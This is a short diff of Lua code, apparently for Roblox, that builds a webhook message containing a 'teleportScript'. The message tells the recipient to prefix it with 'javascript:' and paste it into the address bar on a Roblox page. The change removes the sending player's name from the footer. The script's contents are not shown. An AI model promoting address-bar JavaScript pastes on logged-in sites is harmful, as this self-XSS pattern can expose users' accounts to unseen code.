@@ -88,7 +88,7 @@ delay(30, function()
 					["description"] = "SCRIPT:\n```java\n// go onto a roblox page and paste this into the address bar | write 'javascript:' infront of the script\n"..teleportScript.."\n```",
 					["fields"] = {},
 					["footer"] = {
-						["text"] = "SENT FROM "..string.upper(player.Name).." | "..time
+						["text"] = time
 					},
 					["color"] = 16758725
 				}
